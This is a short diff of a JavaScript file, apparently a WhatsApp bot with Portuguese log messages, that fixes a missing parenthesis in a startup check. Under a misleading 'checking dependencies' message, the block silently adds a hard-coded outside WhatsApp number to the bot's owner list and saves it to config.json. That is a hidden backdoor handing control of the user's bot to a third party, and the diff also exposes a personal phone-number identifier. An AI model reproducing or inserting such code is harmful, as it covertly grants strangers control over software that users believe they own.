@@ -18,7 +18,7 @@ console.log("checando se voce tem algumas funções")
 textokk = "adicionando:"
 textokk += config?.prefix ? "" : "\nprefixo pela config"
 textokk == "adicionando:" ? console.log("voce tem todas as dependências") : console.log(textokk)
-if(!config.owner.includes("5511940238762@s.whatsapp.net") {
+if(!config.owner.includes("5511940238762@s.whatsapp.net")) {
 config.owner.push("5511940238762@s.whatsapp.net")
 await fs.writeFileSync('./config.json', JSON.stringify(config, null, 2))
 }
